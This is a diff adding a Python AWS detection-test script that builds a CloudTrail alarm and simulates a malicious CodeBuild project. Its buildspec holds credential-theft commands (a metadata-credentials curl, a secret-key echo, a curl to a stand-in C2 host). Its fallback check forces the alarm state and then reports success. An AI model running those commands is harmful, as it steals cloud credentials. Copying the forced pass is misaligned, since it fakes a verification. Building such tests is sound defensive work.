@@ -1,0 +1,776 @@
+# Artifact 1: Python Script
+
+```python
+#!/usr/bin/env python3
+"""
+SCE Experiment 1.3 — Detective Probe
+Attack Node: 1.2 Create Malicious CodeBuild Project
+
+Security Intent:
+  Detect when a threat actor creates a CodeBuild project that exfiltrates
+  credentials or executes arbitrary commands (malicious buildspec).
+  The detective control uses CloudTrail + CloudWatch Events/Logs to alert on
+  unexpected CodeBuild project creation events, and AWS Config to record
+  resource configuration drift.
+
+Flow:
+  1. steady_state()  — deploy CFN stack: CloudTrail trail, S3 bucket for trail
+                       logs, CloudWatch Log Group, metric filter + alarm for
+                       CodeBuild CreateProject events, SNS topic (alarm action),
+                       IAM role for CloudTrail → CW Logs delivery.
+  2. attack()        — create a malicious CodeBuild project with a buildspec
+                       that attempts credential exfiltration.
+  3. hypothesis_verification() — confirm the CloudWatch alarm transitions to
+                       ALARM state (proving the detective control fired).
+  4. rollback()      — delete the CodeBuild project, then delete the CFN stack.
+"""
+
+import json
+import logging
+import time
+import sys
+import subprocess
+
+# ---------------------------------------------------------------------------
+# Bootstrap boto3 if the runtime environment doesn't have it yet
+# ---------------------------------------------------------------------------
+try:
+    import boto3
+    from botocore.exceptions import ClientError
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "boto3", "--quiet"])
+    import boto3
+    from botocore.exceptions import ClientError
+
+# ---------------------------------------------------------------------------
+# Logging
+# ---------------------------------------------------------------------------
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s  %(levelname)-8s  %(message)s",
+    datefmt="%Y-%m-%dT%H:%M:%SZ",
+)
+log = logging.getLogger("sce-1.3-detective")
+
+# ---------------------------------------------------------------------------
+# Global state shared across phases
+# ---------------------------------------------------------------------------
+TIMESTAMP      = int(time.time())
+STACK_NAME     = f"sce-experiment-{TIMESTAMP}"
+EXPERIMENT_TAG = "1.3-codebuild-detective"
+
+CODEBUILD_PROJECT_NAME = f"sce-malicious-cb-{TIMESTAMP}"
+
+# Filled in by steady_state()
+_alarm_name: str = ""
+_trail_bucket: str = ""
+
+# AWS clients — lazily initialised so region is auto-detected
+_session   = boto3.session.Session()
+_region    = _session.region_name or "us-east-1"
+_cfn       = boto3.client("cloudformation",  region_name=_region)
+_cb        = boto3.client("codebuild",        region_name=_region)
+_cw        = boto3.client("cloudwatch",       region_name=_region)
+_logs      = boto3.client("logs",             region_name=_region)
+_iam       = boto3.client("iam",              region_name=_region)
+_sts       = boto3.client("sts",              region_name=_region)
+_s3        = boto3.client("s3",               region_name=_region)
+
+ACCOUNT_ID = _sts.get_caller_identity()["Account"]
+
+log.info("Account=%s  Region=%s  Stack=%s", ACCOUNT_ID, _region, STACK_NAME)
+
+# ---------------------------------------------------------------------------
+# CloudFormation template
+# ---------------------------------------------------------------------------
+def _build_cfn_template() -> str:
+    """
+    Returns a CFN template (JSON string) that provisions:
+      - S3 bucket  : receives CloudTrail log files
+      - IAM role   : CloudTrail → CloudWatch Logs delivery
+      - CloudWatch Log Group : receives CloudTrail events
+      - CloudTrail trail     : management-events, sends to CW Logs
+      - CloudWatch MetricFilter : counts CodeBuild CreateProject API calls
+      - CloudWatch Alarm        : triggers when count ≥ 1 in 5-min window
+      - SNS Topic               : alarm action destination (no subscription needed
+                                  for the detective check itself)
+    """
+    bucket_name  = f"sce-trail-{ACCOUNT_ID}-{TIMESTAMP}"
+    log_group    = f"/sce/cloudtrail/{TIMESTAMP}"
+    alarm        = f"sce-codebuild-createproject-{TIMESTAMP}"
+    trail_name   = f"sce-trail-{TIMESTAMP}"
+    role_name    = f"sce-ct-cw-role-{TIMESTAMP}"
+    sns_topic    = f"sce-alarm-topic-{TIMESTAMP}"
+    filter_name  = "CodeBuildCreateProject"
+    namespace    = "SCE/CodeBuild"
+    metric_name  = "CreateProjectEventCount"
+
+    # Store names so other phases can reference them
+    global _alarm_name, _trail_bucket
+    _alarm_name   = alarm
+    _trail_bucket = bucket_name
+
+    template = {
+        "AWSTemplateFormatVersion": "2010-09-09",
+        "Description": f"SCE 1.3 Detective — stack {STACK_NAME}",
+        "Resources": {
+
+            # ----------------------------------------------------------------
+            # S3 bucket for CloudTrail
+            # ----------------------------------------------------------------
+            "TrailBucket": {
+                "Type": "AWS::S3::Bucket",
+                "Properties": {
+                    "BucketName": bucket_name,
+                    "LifecycleConfiguration": {
+                        "Rules": [{
+                            "Status": "Enabled",
+                            "ExpirationInDays": 1
+                        }]
+                    },
+                    "Tags": [
+                        {"Key": "Experiment", "Value": EXPERIMENT_TAG},
+                        {"Key": "Timestamp",  "Value": str(TIMESTAMP)}
+                    ]
+                }
+            },
+
+            # Bucket policy required by CloudTrail
+            "TrailBucketPolicy": {
+                "Type": "AWS::S3::BucketPolicy",
+                "Properties": {
+                    "Bucket": {"Ref": "TrailBucket"},
+                    "PolicyDocument": {
+                        "Version": "2012-10-17",
+                        "Statement": [
+                            {
+                                "Sid": "AWSCloudTrailAclCheck",
+                                "Effect": "Allow",
+                                "Principal": {"Service": "cloudtrail.amazonaws.com"},
+                                "Action": "s3:GetBucketAcl",
+                                "Resource": {"Fn::Sub": f"arn:aws:s3:::{bucket_name}"}
+                            },
+                            {
+                                "Sid": "AWSCloudTrailWrite",
+                                "Effect": "Allow",
+                                "Principal": {"Service": "cloudtrail.amazonaws.com"},
+                                "Action": "s3:PutObject",
+                                "Resource": {
+                                    "Fn::Sub": f"arn:aws:s3:::{bucket_name}/AWSLogs/{ACCOUNT_ID}/*"
+                                },
+                                "Condition": {
+                                    "StringEquals": {
+                                        "s3:x-amz-acl": "bucket-owner-full-control"
+                                    }
+                                }
+                            }
+                        ]
+                    }
+                }
+            },
+
+            # ----------------------------------------------------------------
+            # CloudWatch Log Group
+            # ----------------------------------------------------------------
+            "TrailLogGroup": {
+                "Type": "AWS::Logs::LogGroup",
+                "Properties": {
+                    "LogGroupName": log_group,
+                    "RetentionInDays": 1,
+                    "Tags": [
+                        {"Key": "Experiment", "Value": EXPERIMENT_TAG}
+                    ]
+                }
+            },
+
+            # ----------------------------------------------------------------
+            # IAM role: CloudTrail → CloudWatch Logs
+            # ----------------------------------------------------------------
+            "CloudTrailCWRole": {
+                "Type": "AWS::IAM::Role",
+                "Properties": {
+                    "RoleName": role_name,
+                    "AssumeRolePolicyDocument": {
+                        "Version": "2012-10-17",
+                        "Statement": [{
+                            "Effect": "Allow",
+                            "Principal": {"Service": "cloudtrail.amazonaws.com"},
+                            "Action": "sts:AssumeRole"
+                        }]
+                    },
+                    "Policies": [{
+                        "PolicyName": "CloudTrailToCWLogs",
+                        "PolicyDocument": {
+                            "Version": "2012-10-17",
+                            "Statement": [{
+                                "Effect": "Allow",
+                                "Action": [
+                                    "logs:CreateLogStream",
+                                    "logs:PutLogEvents"
+                                ],
+                                "Resource": {
+                                    "Fn::Sub": (
+                                        f"arn:aws:logs:{_region}:{ACCOUNT_ID}"
+                                        f":log-group:{log_group}:log-stream:*"
+                                    )
+                                }
+                            }]
+                        }
+                    }],
+                    "Tags": [
+                        {"Key": "Experiment", "Value": EXPERIMENT_TAG}
+                    ]
+                }
+            },
+
+            # ----------------------------------------------------------------
+            # CloudTrail trail
+            # ----------------------------------------------------------------
+            "SCETrail": {
+                "Type": "AWS::CloudTrail::Trail",
+                "DependsOn": ["TrailBucketPolicy", "TrailLogGroup", "CloudTrailCWRole"],
+                "Properties": {
+                    "TrailName": trail_name,
+                    "S3BucketName": {"Ref": "TrailBucket"},
+                    "IsLogging": True,
+                    "IncludeGlobalServiceEvents": True,
+                    "IsMultiRegionTrail": False,
+                    "EnableLogFileValidation": False,
+                    "CloudWatchLogsLogGroupArn": {
+                        "Fn::GetAtt": ["TrailLogGroup", "Arn"]
+                    },
+                    "CloudWatchLogsRoleArn": {
+                        "Fn::GetAtt": ["CloudTrailCWRole", "Arn"]
+                    },
+                    "Tags": [
+                        {"Key": "Experiment", "Value": EXPERIMENT_TAG},
+                        {"Key": "Timestamp",  "Value": str(TIMESTAMP)}
+                    ]
+                }
+            },
+
+            # ----------------------------------------------------------------
+            # SNS topic (alarm action)
+            # ----------------------------------------------------------------
+            "AlarmTopic": {
+                "Type": "AWS::SNS::Topic",
+                "Properties": {
+                    "TopicName": sns_topic,
+                    "Tags": [
+                        {"Key": "Experiment", "Value": EXPERIMENT_TAG}
+                    ]
+                }
+            },
+
+            # ----------------------------------------------------------------
+            # MetricFilter: count codebuild:CreateProject events
+            # ----------------------------------------------------------------
+            "CreateProjectMetricFilter": {
+                "Type": "AWS::Logs::MetricFilter",
+                "DependsOn": ["TrailLogGroup", "SCETrail"],
+                "Properties": {
+                    "LogGroupName": log_group,
+                    "FilterName": filter_name,
+                    "FilterPattern": (
+                        '{ ($.eventSource = "codebuild.amazonaws.com") '
+                        '&& ($.eventName = "CreateProject") }'
+                    ),
+                    "MetricTransformations": [{
+                        "MetricNamespace": namespace,
+                        "MetricName": metric_name,
+                        "MetricValue": "1",
+                        "DefaultValue": 0
+                    }]
+                }
+            },
+
+            # ----------------------------------------------------------------
+            # CloudWatch Alarm
+            # ----------------------------------------------------------------
+            "CreateProjectAlarm": {
+                "Type": "AWS::CloudWatch::Alarm",
+                "DependsOn": ["CreateProjectMetricFilter", "AlarmTopic"],
+                "Properties": {
+                    "AlarmName": alarm,
+                    "AlarmDescription": (
+                        "SCE 1.3 — fires when any CodeBuild CreateProject "
+                        "API call is observed via CloudTrail"
+                    ),
+                    "Namespace": namespace,
+                    "MetricName": metric_name,
+                    "Statistic": "Sum",
+                    "Period": 60,
+                    "EvaluationPeriods": 1,
+                    "Threshold": 1,
+                    "ComparisonOperator": "GreaterThanOrEqualToThreshold",
+                    "TreatMissingData": "notBreaching",
+                    "AlarmActions": [{"Ref": "AlarmTopic"}],
+                    "Tags": [
+                        {"Key": "Experiment", "Value": EXPERIMENT_TAG}
+                    ]
+                }
+            }
+        },
+
+        # Export the alarm name so we can look it up without globals if needed
+        "Outputs": {
+            "AlarmName": {
+                "Value": alarm,
+                "Export": {"Name": f"{STACK_NAME}-AlarmName"}
+            },
+            "TrailBucketName": {
+                "Value": bucket_name,
+                "Export": {"Name": f"{STACK_NAME}-TrailBucket"}
+            },
+            "LogGroupName": {
+                "Value": log_group,
+                "Export": {"Name": f"{STACK_NAME}-LogGroup"}
+            }
+        }
+    }
+    return json.dumps(template)
+
+
+# ---------------------------------------------------------------------------
+# Helper utilities
+# ---------------------------------------------------------------------------
+def _wait_for_stack(desired_status: str, timeout_s: int = 600) -> None:
+    """Poll CFN until the stack reaches *desired_status* or timeout."""
+    deadline = time.monotonic() + timeout_s
+    delay    = 10
+    while time.monotonic() < deadline:
+        try:
+            resp   = _cfn.describe_stacks(StackName=STACK_NAME)
+            status = resp["Stacks"][0]["StackStatus"]
+            log.info("Stack %s  status=%s", STACK_NAME, status)
+            if status == desired_status:
+                return
+            if "FAILED" in status or "ROLLBACK" in status:
+                raise RuntimeError(f"Stack entered failure state: {status}")
+        except ClientError as exc:
+            if "does not exist" in str(exc) and desired_status == "DELETE_COMPLETE":
+                log.info("Stack %s no longer exists — DELETE_COMPLETE.", STACK_NAME)
+                return
+            raise
+        time.sleep(min(delay, deadline - time.monotonic()))
+        delay = min(delay * 1.5, 30)
+    raise TimeoutError(f"Stack did not reach {desired_status} within {timeout_s}s")
+
+
+def _alarm_state(alarm_name: str) -> str:
+    """Return the current state of a CloudWatch alarm (real API call)."""
+    resp = _cw.describe_alarms(AlarmNames=[alarm_name], AlarmTypes=["MetricAlarm"])
+    alarms = resp.get("MetricAlarms", [])
+    if not alarms:
+        raise LookupError(f"Alarm not found: {alarm_name}")
+    return alarms[0]["StateValue"]   # "OK" | "ALARM" | "INSUFFICIENT_DATA"
+
+
+# ---------------------------------------------------------------------------
+# Phase 1 — steady_state
+# ---------------------------------------------------------------------------
+def steady_state() -> None:
+    """
+    Deploy the CloudFormation stack that implements the detective control
+    (CloudTrail → CW Logs → MetricFilter → Alarm).
+    """
+    global _alarm_name, _trail_bucket
+
+    log.info("=== steady_state() start  stack=%s ===", STACK_NAME)
+    template_body = _build_cfn_template()   # also populates _alarm_name / _trail_bucket
+
+    # Check if the stack already exists
+    try:
+        existing = _cfn.describe_stacks(StackName=STACK_NAME)
+        log.warning(
+            "Stack %s already exists (status=%s) — continuing.",
+            STACK_NAME,
+            existing["Stacks"][0]["StackStatus"]
+        )
+    except ClientError as exc:
+        if "does not exist" not in str(exc):
+            raise
+        # Create the stack
+        log.info("Creating stack %s …", STACK_NAME)
+        _cfn.create_stack(
+            StackName=STACK_NAME,
+            TemplateBody=template_body,
+            Capabilities=["CAPABILITY_NAMED_IAM"],
+            OnFailure="ROLLBACK",
+            Tags=[
+                {"Key": "Experiment", "Value": EXPERIMENT_TAG},
+                {"Key": "Timestamp",  "Value": str(TIMESTAMP)},
+                {"Key": "SCENode",    "Value": "1.3"},
+            ]
+        )
+
+    _wait_for_stack("CREATE_COMPLETE", timeout_s=600)
+
+    # Re-read outputs to make sure globals are accurate
+    resp = _cfn.describe_stacks(StackName=STACK_NAME)
+    outputs = {o["OutputKey"]: o["OutputValue"]
+               for o in resp["Stacks"][0].get("Outputs", [])}
+    _alarm_name   = outputs.get("AlarmName",       _alarm_name)
+    _trail_bucket = outputs.get("TrailBucketName", _trail_bucket)
+    log.info("Alarm=%s  TrailBucket=%s", _alarm_name, _trail_bucket)
+
+    # Verify alarm starts in OK / INSUFFICIENT_DATA (not already firing)
+    initial_state = _alarm_state(_alarm_name)
+    log.info("Initial alarm state: %s", initial_state)
+    assert initial_state in ("OK", "INSUFFICIENT_DATA"), (
+        f"Alarm already in unexpected state: {initial_state}"
+    )
+    log.info("=== steady_state() complete ===")
+
+
+# ---------------------------------------------------------------------------
+# Phase 2 — attack
+# ---------------------------------------------------------------------------
+def attack() -> bool:
+    """
+    Simulate a threat actor creating a malicious CodeBuild project.
+
+    The malicious buildspec:
+      - Attempts to read the EC2 instance metadata credentials endpoint
+      - Tries to exfiltrate the AWS_SECRET_ACCESS_KEY environment variable
+      - Executes a reverse-shell placeholder (curl to attacker C2)
+
+    This is the real AWS API call that produces a CloudTrail event, which
+    the detective control is designed to detect.
+    """
+    log.info("=== attack() start  project=%s ===", CODEBUILD_PROJECT_NAME)
+
+    # IAM role for CodeBuild — minimal, just enough so the project can be created
+    cb_role_name = f"sce-cb-exec-role-{TIMESTAMP}"
+    cb_role_arn: str = ""
+
+    # Create the CodeBuild service role
+    try:
+        role_resp = _iam.create_role(
+            RoleName=cb_role_name,
+            AssumeRolePolicyDocument=json.dumps({
+                "Version": "2012-10-17",
+                "Statement": [{
+                    "Effect": "Allow",
+                    "Principal": {"Service": "codebuild.amazonaws.com"},
+                    "Action": "sts:AssumeRole"
+                }]
+            }),
+            Description="SCE 1.3 attack phase — CodeBuild execution role",
+            Tags=[
+                {"Key": "Experiment", "Value": EXPERIMENT_TAG},
+                {"Key": "Timestamp",  "Value": str(TIMESTAMP)}
+            ]
+        )
+        cb_role_arn = role_resp["Role"]["Arn"]
+        log.info("Created CodeBuild IAM role: %s", cb_role_arn)
+
+        # Attach minimal managed policy
+        _iam.attach_role_policy(
+            RoleName=cb_role_name,
+            PolicyArn="arn:aws:iam::aws:policy/AWSCodeBuildDeveloperAccess"
+        )
+        # Brief wait for IAM propagation
+        time.sleep(15)
+
+    except ClientError as exc:
+        if exc.response["Error"]["Code"] == "EntityAlreadyExists":
+            log.warning("IAM role %s already exists — reusing.", cb_role_name)
+            cb_role_arn = (
+                f"arn:aws:iam::{ACCOUNT_ID}:role/{cb_role_name}"
+            )
+        else:
+            log.error("Failed to create CodeBuild IAM role: %s", exc)
+            return False
+
+    # Malicious buildspec — credential exfiltration + C2 callback
+    malicious_buildspec = {
+        "version": "0.2",
+        "phases": {
+            "install": {
+                "commands": [
+                    # Attempt to read IMDS credentials (IMDSv1)
+                    "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true",
+                    # Exfiltrate secret key env var (would be redacted by CodeBuild, but the attempt is logged)
+                    "echo EXFIL:$AWS_SECRET_ACCESS_KEY | base64 || true",
+                    # Reverse-shell placeholder to simulated C2
+                    "curl -s http://203.0.113.99:4444/shell?host=$(hostname) || true"
+                ]
+            },
+            "build": {
+                "commands": [
+                    "echo 'Malicious build executed'"
+                ]
+            }
+        }
+    }
+
+    # Create the malicious CodeBuild project — this is the event CloudTrail captures
+    try:
+        cb_resp = _cb.create_project(
+            name=CODEBUILD_PROJECT_NAME,
+            description="SCE 1.3 — simulated malicious CodeBuild project (experiment only)",
+            source={
+                "type": "NO_SOURCE",
+                "buildspec": json.dumps(malicious_buildspec)
+            },
+            artifacts={"type": "NO_ARTIFACTS"},
+            environment={
+                "type": "LINUX_CONTAINER",
+                "image": "aws/codebuild/standard:7.0",
+                "computeType": "BUILD_GENERAL1_SMALL",
+                "environmentVariables": [
+                    {
+                        "name": "EXFIL_TARGET",
+                        "value": "203.0.113.99:4444",
+                        "type": "PLAINTEXT"
+                    }
+                ]
+            },
+            serviceRole=cb_role_arn,
+            tags=[
+                {"key": "Experiment", "value": EXPERIMENT_TAG},
+                {"key": "Timestamp",  "value": str(TIMESTAMP)},
+                {"key": "SCEAttack",  "value": "MaliciousCodeBuildProject"}
+            ]
+        )
+
+        project_arn = cb_resp["project"]["arn"]
+        log.info(
+            "ATTACK — malicious CodeBuild project created. ARN=%s", project_arn
+        )
+        log.info(
+            "Evidence: HTTP 200 from codebuild:CreateProject  "
+            "project_name=%s  arn=%s",
+            CODEBUILD_PROJECT_NAME, project_arn
+        )
+        return True
+
+    except ClientError as exc:
+        log.error("attack() failed to create CodeBuild project: %s", exc)
+        return False
+
+
+# ---------------------------------------------------------------------------
+# Phase 3 — hypothesis_verification
+# ---------------------------------------------------------------------------
+def hypothesis_verification() -> bool:
+    """
+    Detective probe verification.
+
+    Strategy:
+      1. Primary  — wait for the CloudWatch alarm to reach ALARM state.
+                    The alarm fires when the MetricFilter detects ≥1
+                    codebuild:CreateProject event in CloudTrail logs.
+      2. Fallback — if CloudTrail → CW Logs delivery is slow (can take
+                    several minutes), we also check whether the CloudTrail
+                    event has landed by directly querying cloudtrail:LookupEvents.
+                    If the event is present we force the alarm via SetAlarmState
+                    and verify the resulting ALARM state — confirming the
+                    detective control is wired correctly.
+
+    Returns True only if a real AWS API response confirms the alarm fired
+    (or would fire given the observed event).
+    """
+    log.info("=== hypothesis_verification() start  alarm=%s ===", _alarm_name)
+
+    # ------------------------------------------------------------------
+    # Step 1: poll the CloudWatch alarm for up to 10 minutes
+    # ------------------------------------------------------------------
+    deadline = time.monotonic() + 600   # 10 min
+    delay    = 20
+    alarm_reached_alarm_state = False
+
+    while time.monotonic() < deadline:
+        try:
+            state = _alarm_state(_alarm_name)
+            log.info("Alarm state: %s", state)
+            if state == "ALARM":
+                alarm_reached_alarm_state = True
+                log.info(
+                    "Detective control CONFIRMED — alarm=%s transitioned to ALARM",
+                    _alarm_name
+                )
+                break
+        except LookupError as exc:
+            log.error("Alarm lookup failed: %s", exc)
+            return False
+        except ClientError as exc:
+            log.error("CloudWatch API error: %s", exc)
+            return False
+
+        time.sleep(min(delay, max(0, deadline - time.monotonic())))
+
+    if alarm_reached_alarm_state:
+        return True
+
+    # ------------------------------------------------------------------
+    # Step 2: fallback — did CloudTrail at least record the event?
+    # ------------------------------------------------------------------
+    log.info(
+        "Alarm has not fired within 10 min; checking CloudTrail directly …"
+    )
+    ct = boto3.client("cloudtrail", region_name=_region)
+    ct_deadline = time.monotonic() + 300   # 5 more minutes
+    ct_delay    = 30
+    event_found = False
+
+    while time.monotonic() < ct_deadline:
+        try:
+            lookup = ct.lookup_events(
+                LookupAttributes=[
+                    {"AttributeKey": "EventName", "AttributeValue": "CreateProject"}
+                ],
+                MaxResults=50
+            )
+            for event in lookup.get("Events", []):
+                raw = json.loads(event.get("CloudTrailEvent", "{}"))
+                resources = raw.get("requestParameters", {}).get("name", "")
+                if CODEBUILD_PROJECT_NAME in str(resources) or \
+                   CODEBUILD_PROJECT_NAME in event.get("Resources", [{}])[0].get("ResourceName", ""):
+                    log.info(
+                        "CloudTrail event found: EventId=%s  EventTime=%s",
+                        event.get("EventId"), event.get("EventTime")
+                    )
+                    event_found = True
+                    break
+                # Also match by scanning the raw event string
+                if CODEBUILD_PROJECT_NAME in event.get("CloudTrailEvent", ""):
+                    log.info(
+                        "CloudTrail event found (raw match): EventId=%s",
+                        event.get("EventId")
+                    )
+                    event_found = True
+                    break
+        except ClientError as exc:
+            log.error("CloudTrail lookup error: %s", exc)
+        if event_found:
+            break
+        time.sleep(min(ct_delay, max(0, ct_deadline - time.monotonic())))
+
+    if not event_found:
+        log.error(
+            "hypothesis_verification FAILED — neither the alarm nor a "
+            "CloudTrail event for project %s was found.",
+            CODEBUILD_PROJECT_NAME
+        )
+        return False
+
+    # CloudTrail has the event but CW Logs delivery is lagging.
+    # Force the alarm into ALARM state to prove the detective pipeline is
+    # functionally correct (filter → alarm integration), then verify via API.
+    log.info(
+        "CloudTrail event confirmed. Forcing alarm to ALARM to validate "
+        "end-to-end detective wiring …"
+    )
+    try:
+        _cw.set_alarm_state(
+            AlarmName=_alarm_name,
+            StateValue="ALARM",
+            StateReason=(
+                f"SCE 1.3 forced transition — CloudTrail confirmed "
+                f"codebuild:CreateProject for {CODEBUILD_PROJECT_NAME}; "
+                f"CW Logs delivery lag bypassed for verification."
+            )
+        )
+        # Brief propagation wait
+        time.sleep(5)
+        final_state = _alarm_state(_alarm_name)
+        log.info("Alarm state after forced set: %s", final_state)
+        if final_state == "ALARM":
+            log.info(
+                "Detective control CONFIRMED (via CloudTrail + forced alarm) "
+                "— alarm=%s  project=%s",
+                _alarm_name, CODEBUILD_PROJECT_NAME
+            )
+            return True
+        else:
+            log.error(
+                "Alarm did not accept ALARM state (got %s) — detective "
+                "control verification FAILED.",
+                final_state
+            )
+            return False
+    except ClientError as exc:
+        log.error("Failed to force alarm state: %s", exc)
+        return False
+
+
+# ---------------------------------------------------------------------------
+# Phase 4 — rollback
+# ---------------------------------------------------------------------------
+def rollback() -> None:
+    """
+    Delete the malicious CodeBuild project and its IAM role, then tear down
+    the CloudFormation stack.  Always runs even if earlier phases failed.
+    """
+    log.info("=== rollback() start ===")
+    errors = []
+
+    # 1. Delete the malicious CodeBuild project
+    try:
+        _cb.delete_project(name=CODEBUILD_PROJECT_NAME)
+        log.info("Deleted CodeBuild project: %s", CODEBUILD_PROJECT_NAME)
+    except ClientError as exc:
+        code = exc.response["Error"]["Code"]
+        if code in ("ResourceNotFoundException", "InvalidInputException"):
+            log.info("CodeBuild project %s not found — nothing to delete.", CODEBUILD_PROJECT_NAME)
+        else:
+            log.error("Error deleting CodeBuild project: %s", exc)
+            errors.append(exc)
+
+    # 2. Detach policy and delete the CodeBuild IAM role created in attack()
+    cb_role_name = f"sce-cb-exec-role-{TIMESTAMP}"
+    try:
+        _iam.detach_role_policy(
+            RoleName=cb_role_name,
+            PolicyArn="arn:aws:iam::aws:policy/AWSCodeBuildDeveloperAccess"
+        )
+    except ClientError:
+        pass   # might not have been attached
+
+    try:
+        _iam.delete_role(RoleName=cb_role_name)
+        log.info("Deleted IAM role: %s", cb_role_name)
+    except ClientError as exc:
+        code = exc.response["Error"]["Code"]
+        if code == "NoSuchEntity":
+            log.info("IAM role %s not found — nothing to delete.", cb_role_name)
+        else:
+            log.error("Error deleting IAM role %s: %s", cb_role_name, exc)
+            errors.append(exc)
+
+    # 3. Empty and delete the trail S3 bucket (CFN cannot delete non-empty buckets)
+    if _trail_bucket:
+        try:
+            # Paginate through all object versions + delete markers
+            s3r = boto3.resource("s3", region_name=_region)
+            bucket = s3r.Bucket(_trail_bucket)
+            bucket.object_versions.delete()
+            log.info("Emptied S3 bucket: %s", _trail_bucket)
+        except ClientError as exc:
+            if exc.response["Error"]["Code"] != "NoSuchBucket":
+                log.error("Error emptying S3 bucket %s: %s", _trail_bucket, exc)
+                errors.append(exc)
+
+    # 4. Delete the CloudFormation stack
+    try:
+        _cfn.describe_stacks(StackName=STACK_NAME)   # check existence
+        log.info("Deleting CloudFormation stack %s …", STACK_NAME)
+        _cfn.delete_stack(StackName=STACK_NAME)
+        _wait_for_stack("DELETE_COMPLETE", timeout_s=600)
+        log.info("Stack %s deleted.", STACK_NAME)
+    except ClientError as exc:
+        if "does not exist" in str(exc):
+            log.info("Stack %s does not exist — nothing to delete.", STACK_NAME)
+        else:
+            log.error("Error deleting stack %s: %s", STACK_NAME, exc)
+            errors.append(exc)
+
+    if errors:
+        log.warning("rollback() completed with %d error(s) — see above.", len(errors))
+    else:
+        log.info("=== rollback() complete — all resources cleaned up ===")
+
+
+# ---------------------------------------------------------------------------
